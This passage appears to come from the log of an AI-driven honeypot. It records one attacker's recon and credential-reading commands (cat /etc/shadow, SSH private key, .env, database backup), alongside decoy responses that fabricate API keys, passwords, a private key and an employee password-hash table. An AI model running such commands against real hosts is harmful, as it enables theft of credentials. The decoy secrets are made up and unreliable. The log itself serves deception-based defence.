    "ai_decision": "-----BEGIN OPENSSH PRIVATE KEY-----\n3BgAGXDzReFxAQiQlbPSSv3yH48kufBQP8RYx1fA/nMmBIHE8aEknpVwgcFR4wHJLsZFHu\n4bmKOPJyhox3tc+tDz57wVZJesbXjQxWIZXivHG+Y/GOdXFF0DLPC+wTnzVJ3BQC8rxfRR\nQF3we0ULoPhcY8VYxg29iGmJg7FxD3bWFhMLwZfksCc/k+qsUHN5pDKOk6V/wh1SOUXr9Y\nwdSWJxJSrR3rfoT2VA3l0Z2T5kCRZJq4Fed6VY0ZQvYnlufaQkMDq2k9WmFsKWGgiE+rLA\nWHiEZlcJoARJv9UgLqmTgvFKp22kRyrdWmTUHX1R/DeeYNOgM7RiK8jmnQx0/g==\n-----END OPENSSH PRIVATE KEY-----",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:14:47,473 - {
    "session_id": "71dd20b2",
    "query": "cat /home/ubuntu/.env",
    "response": "# Environment variables for Xynera application\nDEBUG=false\nENVIRONMENT=production\nPORT=8080\n\n# Database credentials\nDATABASE_URL=postgresql://db_user:securePassword123@prod-db-01.xynera.local:5432/xynera_prod\n\n# Third-party APIs\nSTRIPE_API_KEY=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\nSLACK_WEBHOOK_URL=https://hooks.slack.com/services/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\nGITHUB_TOKEN=ghp_A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8\nOPENAI_API_KEY=sk-proj-aB1c2D3e4F5g6H7i8J9k0L1m2N3o4P5q6R7s8T9uV5w",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 87,
        "risk_level": "CRITICAL",
        "final_score": 87,
        "threat_level": "CRITICAL",
        "base_score": 87,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 44,
            "unique_commands": 41,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 503,
            "commands_executed": 44,
            "successful_commands": 43,
            "failed_commands": 1,
            "files_accessed": 4,
            "services_accessed": 1,
            "engagement_score": 81,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 87,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:14:47,474 - {"session_id": "71dd20b2", "command": "cat /home/ubuntu/.env", "attack_type": "Unknown", "risk_score": 87, "threat_level": "CRITICAL"}
2026-07-21 11:14:47,474 - {
    "session_id": "71dd20b2",
    "command": "cat /home/ubuntu/.env",
    "ai_decision": "# Environment variables for Xynera application\nDEBUG=false\nENVIRONMENT=production\nPORT=8080\n\n# Database credentials\nDATABASE_URL=postgresql://db_user:securePassword123@prod-db-01.xynera.local:5432/xynera_prod\n\n# Third-party APIs\nSTRIPE_API_KEY=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\nSLACK_WEBHOOK_URL=https://hooks.slack.com/services/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\nGITHUB_TOKEN=ghp_A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8\nOPENAI_API_KEY=sk-proj-aB1c2D3e4F5g6H7i8J9k0L1m2N3o4P5q6R7s8T9uV5w",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 44
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 87,
    "threat_level": "CRITICAL"
}
2026-07-21 11:14:47,474 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: cat /home/ubuntu/.env",
    "ai_decision": "# Environment variables for Xynera application\nDEBUG=false\nENVIRONMENT=production\nPORT=8080\n\n# Database credentials\nDATABASE_URL=postgresql://db_user:securePassword123@prod-db-01.xynera.local:5432/xynera_prod\n\n# Third-party APIs\nSTRIPE_API_KEY=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\nSLACK_WEBHOOK_URL=https://hooks.slack.com/services/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\nGITHUB_TOKEN=ghp_A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8\nOPENAI_API_KEY=sk-proj-aB1c2D3e4F5g6H7i8J9k0L1m2N3o4P5q6R7s8T9uV5w",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:14:47,569 - {
    "session_id": "71dd20b2",
    "query": "cat /var/www/internal/db_backup.sql",
    "response": "-- PostgreSQL Database Dump\n-- Dumped by pg_dump version 14.5 (Ubuntu 14.5-0ubuntu0.22.04.1)\n\nSET statement_timeout = 0;\nSET lock_timeout = 0;\nSET idle_in_transaction_session_timeout = 0;\nSET client_encoding = 'UTF-8';\nSET standard_conforming_strings = on;\nSELECT pg_catalog.set_config('search_path', '', false);\nSET check_function_bodies = false;\nSET xmloption = content;\nSET client_min_messages = warning;\nSET row_security = off;\n\nCREATE TABLE public.users (\n    id integer NOT NULL,\n    username character varying(50) NOT NULL,\n    password_hash character varying(255) NOT NULL,\n    email character varying(100) NOT NULL,\n    role character varying(20) NOT NULL,\n    created_at timestamp without time zone DEFAULT CURRENT_TIMESTAMP\n);\n\nALTER TABLE public.users OWNER TO db_user;\n\nINSERT INTO public.users (id, username, password_hash, email, role) VALUES\n(1, 'admin', '$2b$12$eImiTXAk4VMV619eFv02eO/J5jVv2uHj2.Hn2s994m8.O/eX/f6H.', 'admin@xynera.local', 'administrator'),\n(2, 'carlos.garcia', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r02s1t2u3v4w5x6y7z8', 'carlos.garcia@xynera.local', 'ceo'),\n(3, 'alice.martin', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r03s1t2u3v4w5x6y7z8', 'alice.martin@xynera.local', 'engineering_director'),\n(4, 'quinn.martin', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r04s1t2u3v4w5x6y7z8', 'quinn.martin@xynera.local', 'hr_manager'),\n(5, 'marcus.moore', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r05s1t2u3v4w5x6y7z8', 'marcus.moore@xynera.local', 'cfo'),\n(6, 'bob.brown', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r06s1t2u3v4w5x6y7z8', 'bob.brown@xynera.local', 'ciso'),\n(7, 'helen.taylor', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r07s1t2u3v4w5x6y7z8', 'helen.taylor@xynera.local', 'operations_director'),\n(8, 'quinn.garcia', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r08s1t2u3v4w5x6y7z8', 'quinn.garcia@xynera.local', 'sales_director'),\n(9, 'diana.anderson', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r09s1t2u3v4w5x6y7z8', 'diana.anderson@xynera.local', 'system_administrator'),\n(10, 'steve.wilson', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r10s1t2u3v4w5x6y7z8', 'steve.wilson@xynera.local', 'account_executive'),\n(11, 'steve.miller', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r11s1t2u3v4w5x6y7z8', 'steve.miller@xynera.local', 'security_engineer'),\n(12, 'fiona.garcia', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r12s1t2u3v4w5x6y7z8', 'fiona.garcia@xynera.local', 'security_engineer'),\n(13, 'fiona.hernandez', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r13s1t2u3v4w5x6y7z8', 'fiona.hernandez@xynera.local', 'ciso'),\n(14, 'laura.davis', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r14s1t2u3v4w5x6y7z8', 'laura.davis@xynera.local', 'system_administrator'),\n(15, 'ian.davis', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r15s1t2u3v4w5x6y7z8', 'ian.davis@xynera.local', 'account_executive'),\n(16, 'steve.thomas', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r16s1t2u3v4w5x6y7z8', 'steve.thomas@xynera.local', 'cfo'),\n(17, 'carlos.anderson', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r17s1t2u3v4w5x6y7z8', 'carlos.anderson@xynera.local', 'financial_analyst'),\n(18, 'tina.martinez', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r18s1t2u3v4w5x6y7z8', 'tina.martinez@xynera.local', 'accountant'),\n(19, 'carlos.thomas', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r19s1t2u3v4w5x6y7z8', 'carlos.thomas@xynera.local', 'account_executive'),\n(20, 'steve.hernandez', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r20s1t2u3v4w5x6y7z8', 'steve.hernandez@xynera.local', 'system_administrator'),\n(21, 'kevin.davis', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r21s1t2u3v4w5x6y7z8', 'kevin.davis@xynera.local', 'frontend_developer'),\n(22, 'bob.williams', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r22s1t2u3v4w5x6y7z8', 'bob.williams@xynera.local', 'sales_director'),\n(23, 'laura.williams', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r23s1t2u3v4w5x6y7z8', 'laura.williams@xynera.local', 'lead_security_analyst'),\n(24, 'tina.taylor', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r24s1t2u3v4w5x6y7z8', 'tina.taylor@xynera.local', 'sales_representative'),\n(25, 'quinn.anderson', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r25s1t2u3v4w5x6y7z8', 'quinn.anderson@xynera.local', 'devops_engineer'),\n(26, 'diana.thomas', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r26s1t2u3v4w5x6y7z8', 'diana.thomas@xynera.local', 'sales_director');\n\nCREATE TABLE public.transactions (\n    transaction_id character varying(36) NOT NULL,\n    user_id integer NOT NULL,\n    amount numeric(10,2) NOT NULL,\n    status character varying(20) NOT NULL,\n    created_at timestamp without time zone DEFAULT CURRENT_TIMESTAMP\n);\n\nALTER TABLE public.transactions OWNER TO db_user;\n\nINSERT INTO public.transactions (transaction_id, user_id, amount, status) VALUES\n('tx_9876543210', 2, 1250.00, 'completed'),\n('tx_1234567890', 1, 45000.00, 'pending');\n\nALTER TABLE ONLY public.users ADD CONSTRAINT users_pkey PRIMARY KEY (id);\nALTER TABLE ONLY public.users ADD CONSTRAINT users_username_key UNIQUE (username);\nALTER TABLE ONLY public.transactions ADD CONSTRAINT transactions_pkey PRIMARY KEY (transaction_id);\nALTER TABLE ONLY public.transactions ADD CONSTRAINT transactions_user_id_fkey FOREIGN KEY (user_id) REFERENCES public.users(id);",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 88,
        "risk_level": "CRITICAL",
        "final_score": 88,
        "threat_level": "CRITICAL",
        "base_score": 88,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 45,
            "unique_commands": 42,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 503,
            "commands_executed": 45,
            "successful_commands": 44,
            "failed_commands": 1,
            "files_accessed": 5,
            "services_accessed": 1,
            "engagement_score": 83,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 88,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:14:47,580 - {"session_id": "71dd20b2", "command": "cat /var/www/internal/db_backup.sql", "attack_type": "Unknown", "risk_score": 88, "threat_level": "CRITICAL"}
2026-07-21 11:14:47,581 - {
    "session_id": "71dd20b2",
    "command": "cat /var/www/internal/db_backup.sql",
    "ai_decision": "-- PostgreSQL Database Dump\n-- Dumped by pg_dump version 14.5 (Ubuntu 14.5-0ubuntu0.22.04.1)\n\nSET statement_timeout = 0;\nSET lock_timeout = 0;\nSET idle_in_transaction_session_timeout = 0;\nSET client_encoding = 'UTF-8';\nSET standard_conforming_strings = on;\nSELECT pg_catalog.set_config('search_path', '', false);\nSET check_function_bodies = false;\nSET xmloption = content;\nSET client_min_messages = warning;\nSET row_security = off;\n\nCREATE TABLE public.users (\n    id integer NOT NULL,\n    username character varying(50) NOT NULL,\n    password_hash character varying(255) NOT NULL,\n    email character varying(100) NOT NULL,\n    role character varying(20) NOT NULL,\n    created_at timestamp without time zone DEFAULT CURRENT_TIMESTAMP\n);\n\nALTER TABLE public.users OWNER TO db_user;\n\nINSERT INTO public.users (id, username, password_hash, email, role) VALUES\n(1, 'admin', '$2b$12$eImiTXAk4VMV619eFv02eO/J5jVv2uHj2.Hn2s994m8.O/eX/f6H.', 'admin@xynera.local', 'administrator'),\n(2, 'carlos.garcia', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r02s1t2u3v4w5x6y7z8', 'carlos.garcia@xynera.local', 'ceo'),\n(3, 'alice.martin', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r03s1t2u3v4w5x6y7z8', 'alice.martin@xynera.local', 'engineering_director'),\n(4, 'quinn.martin', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r04s1t2u3v4w5x6y7z8', 'quinn.martin@xynera.local', 'hr_manager'),\n(5, 'marcus.moore', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r05s1t2u3v4w5x6y7z8', 'marcus.moore@xynera.local', 'cfo'),\n(6, 'bob.brown', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r06s1t2u3v4w5x6y7z8', 'bob.brown@xynera.local', 'ciso'),\n(7, 'helen.taylor', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r07s1t2u3v4w5x6y7z8', 'helen.taylor@xynera.local', 'operations_director'),\n(8, 'quinn.garcia', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r08s1t2u3v4w5x6y7z8', 'quinn.garcia@xynera.local', 'sales_director'),\n(9, 'diana.anderson', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r09s1t2u3v4w5x6y7z8', 'diana.anderson@xynera.local', 'system_administrator'),\n(10, 'steve.wilson', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r10s1t2u3v4w5x6y7z8', 'steve.wilson@xynera.local', 'account_executive'),\n(11, 'steve.miller', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r11s1t2u3v4w5x6y7z8', 'steve.miller@xynera.local', 'security_engineer'),\n(12, 'fiona.garcia', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r12s1t2u3v4w5x6y7z8', 'fiona.garcia@xynera.local', 'security_engineer'),\n(13, 'fiona.hernandez', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r13s1t2u3v4w5x6y7z8', 'fiona.hernandez@xynera.local', 'ciso'),\n(14, 'laura.davis', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r14s1t2u3v4w5x6y7z8', 'laura.davis@xynera.local', 'system_administrator'),\n(15, 'ian.davis', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r15s1t2u3v4w5x6y7z8', 'ian.davis@xynera.local', 'account_executive'),\n(16, 'steve.thomas', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r16s1t2u3v4w5x6y7z8', 'steve.thomas@xynera.local', 'cfo'),\n(17, 'carlos.anderson', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r17s1t2u3v4w5x6y7z8', 'carlos.anderson@xynera.local', 'financial_analyst'),\n(18, 'tina.martinez', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r18s1t2u3v4w5x6y7z8', 'tina.martinez@xynera.local', 'accountant'),\n(19, 'carlos.thomas', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r19s1t2u3v4w5x6y7z8', 'carlos.thomas@xynera.local', 'account_executive'),\n(20, 'steve.hernandez', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r20s1t2u3v4w5x6y7z8', 'steve.hernandez@xynera.local', 'system_administrator'),\n(21, 'kevin.davis', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r21s1t2u3v4w5x6y7z8', 'kevin.davis@xynera.local', 'frontend_developer'),\n(22, 'bob.williams', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r22s1t2u3v4w5x6y7z8', 'bob.williams@xynera.local', 'sales_director'),\n(23, 'laura.williams', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r23s1t2u3v4w5x6y7z8', 'laura.williams@xynera.local', 'lead_security_analyst'),\n(24, 'tina.taylor', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r24s1t2u3v4w5x6y7z8', 'tina.taylor@xynera.local', 'sales_representative'),\n(25, 'quinn.anderson', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r25s1t2u3v4w5x6y7z8', 'quinn.anderson@xynera.local', 'devops_engineer'),\n(26, 'diana.thomas', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r26s1t2u3v4w5x6y7z8', 'diana.thomas@xynera.local', 'sales_director');\n\nCREATE TABLE public.transactions (\n    transaction_id character varying(36) NOT NULL,\n    user_id integer NOT NULL,\n    amount numeric(10,2) NOT NULL,\n    status character varying(20) NOT NULL,\n    created_at timestamp without time zone DEFAULT CURRENT_TIMESTAMP\n);\n\nALTER TABLE public.transactions OWNER TO db_user;\n\nINSERT INTO public.transactions (transaction_id, user_id, amount, status) VALUES\n('tx_9876543210', 2, 1250.00, 'completed'),\n('tx_1234567890', 1, 45000.00, 'pending');\n\nALTER TABLE ONLY public.users ADD CONSTRAINT users_pkey PRIMARY KEY (id);\nALTER TABLE ONLY public.users ADD CONSTRAINT users_username_key UNIQUE (username);\nALTER TABLE ONLY public.transactions ADD CONSTRAINT transactions_pkey PRIMARY KEY (transaction_id);\nALTER TABLE ONLY public.transactions ADD CONSTRAINT transactions_user_id_fkey FOREIGN KEY (user_id) REFERENCES public.users(id);",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 45
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 88,
    "threat_level": "CRITICAL"
}
2026-07-21 11:14:47,581 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: cat /var/www/internal/db_backup.sql",
    "ai_decision": "-- PostgreSQL Database Dump\n-- Dumped by pg_dump version 14.5 (Ubuntu 14.5-0ubuntu0.22.04.1)\n\nSET statement_timeout = 0;\nSET lock_timeout = 0;\nSET idle_in_transaction_session_timeout = 0;\nSET client_encoding = 'UTF-8';\nSET standard_conforming_strings = on;\nSELECT pg_catalog.set_config('search_path', '', false);\nSET check_function_bodies = false;\nSET xmloption = content;\nSET client_min_messages = warning;\nSET row_security = off;\n\nCREATE TABLE public.users (\n    id integer NOT NULL,\n    username character varying(50) NOT NULL,\n    password_hash character varying(255) NOT NULL,\n    email character varying(100) NOT NULL,\n    role character varying(20) NOT NULL,\n    created_at timestamp without time zone DEFAULT CURRENT_TIMESTAMP\n);\n\nALTER TABLE public.users OWNER TO db_user;\n\nINSERT INTO public.users (id, username, password_hash, email, role) VALUES\n(1, 'admin', '$2b$12$eImiTXAk4VMV619eFv02eO/J5jVv2uHj2.Hn2s994m8.O/eX/f6H.', 'admin@xynera.local', 'administrator'),\n(2, 'carlos.garcia', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r02s1t2u3v4w5x6y7z8', 'carlos.garcia@xynera.local', 'ceo'),\n(3, 'alice.martin', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r03s1t2u3v4w5x6y7z8', 'alice.martin@xynera.local', 'engineering_director'),\n(4, 'quinn.martin', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r04s1t2u3v4w5x6y7z8', 'quinn.martin@xynera.local', 'hr_manager'),\n(5, 'marcus.moore', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r05s1t2u3v4w5x6y7z8', 'marcus.moore@xynera.local', 'cfo'),\n(6, 'bob.brown', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r06s1t2u3v4w5x6y7z8', 'bob.brown@xynera.local', 'ciso'),\n(7, 'helen.taylor', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r07s1t2u3v4w5x6y7z8', 'helen.taylor@xynera.local', 'operations_director'),\n(8, 'quinn.garcia', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r08s1t2u3v4w5x6y7z8', 'quinn.garcia@xynera.local', 'sales_director'),\n(9, 'diana.anderson', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r09s1t2u3v4w5x6y7z8', 'diana.anderson@xynera.local', 'system_administrator'),\n(10, 'steve.wilson', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r10s1t2u3v4w5x6y7z8', 'steve.wilson@xynera.local', 'account_executive'),\n(11, 'steve.miller', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r11s1t2u3v4w5x6y7z8', 'steve.miller@xynera.local', 'security_engineer'),\n(12, 'fiona.garcia', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r12s1t2u3v4w5x6y7z8', 'fiona.garcia@xynera.local', 'security_engineer'),\n(13, 'fiona.hernandez', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r13s1t2u3v4w5x6y7z8', 'fiona.hernandez@xynera.local', 'ciso'),\n(14, 'laura.davis', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r14s1t2u3v4w5x6y7z8', 'laura.davis@xynera.local', 'system_administrator'),\n(15, 'ian.davis', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r15s1t2u3v4w5x6y7z8', 'ian.davis@xynera.local', 'account_executive'),\n(16, 'steve.thomas', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r16s1t2u3v4w5x6y7z8', 'steve.thomas@xynera.local', 'cfo'),\n(17, 'carlos.anderson', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r17s1t2u3v4w5x6y7z8', 'carlos.anderson@xynera.local', 'financial_analyst'),\n(18, 'tina.martinez', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r18s1t2u3v4w5x6y7z8', 'tina.martinez@xynera.local', 'accountant'),\n(19, 'carlos.thomas', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r19s1t2u3v4w5x6y7z8', 'carlos.thomas@xynera.local', 'account_executive'),\n(20, 'steve.hernandez', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r20s1t2u3v4w5x6y7z8', 'steve.hernandez@xynera.local', 'system_administrator'),\n(21, 'kevin.davis', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r21s1t2u3v4w5x6y7z8', 'kevin.davis@xynera.local', 'frontend_developer'),\n(22, 'bob.williams', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r22s1t2u3v4w5x6y7z8', 'bob.williams@xynera.local', 'sales_director'),\n(23, 'laura.williams', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r23s1t2u3v4w5x6y7z8', 'laura.williams@xynera.local', 'lead_security_analyst'),\n(24, 'tina.taylor', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r24s1t2u3v4w5x6y7z8', 'tina.taylor@xynera.local', 'sales_representative'),\n(25, 'quinn.anderson', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r25s1t2u3v4w5x6y7z8', 'quinn.anderson@xynera.local', 'devops_engineer'),\n(26, 'diana.thomas', '$2b$12$K3h9j2H8s2h1i9s1j2k3l4m5n6o7p8q9r26s1t2u3v4w5x6y7z8', 'diana.thomas@xynera.local', 'sales_director');\n\nCREATE TABLE public.transactions (\n    transaction_id character varying(36) NOT NULL,\n    user_id integer NOT NULL,\n    amount numeric(10,2) NOT NULL,\n    status character varying(20) NOT NULL,\n    created_at timestamp without time zone DEFAULT CURRENT_TIMESTAMP\n);\n\nALTER TABLE public.transactions OWNER TO db_user;\n\nINSERT INTO public.transactions (transaction_id, user_id, amount, status) VALUES\n('tx_9876543210', 2, 1250.00, 'completed'),\n('tx_1234567890', 1, 45000.00, 'pending');\n\nALTER TABLE ONLY public.users ADD CONSTRAINT users_pkey PRIMARY KEY (id);\nALTER TABLE ONLY public.users ADD CONSTRAINT users_username_key UNIQUE (username);\nALTER TABLE ONLY public.transactions ADD CONSTRAINT transactions_pkey PRIMARY KEY (transaction_id);\nALTER TABLE ONLY public.transactions ADD CONSTRAINT transactions_user_id_fkey FOREIGN KEY (user_id) REFERENCES public.users(id);",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:14:47,676 - {
    "session_id": "71dd20b2",
    "query": "cat /var/www/internal/dev_tasks.md",
    "response": "# Cloud Migration dev tasks\n1. Staging API Gateway deployment:\n   Access the staging API gateway router at `staging-api-01.xynera.local` (`10.200.100.22`) via SSH.\n   Use the local private key stored in `/home/ubuntu/.ssh/id_rsa` (user: `ubuntu`).\n2. API secrets mapping:\n   Ensure the production environment variables inside `/home/ubuntu/.env` are synchronized to the API gateway.\n3. Database replication backup:\n   PostgreSQL schemas are dumped to `/var/www/internal/db_backup.sql`.\n   Ensure they are uploaded to the secure S3 bucket using the credentials in `/home/ubuntu/.aws/credentials`.",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
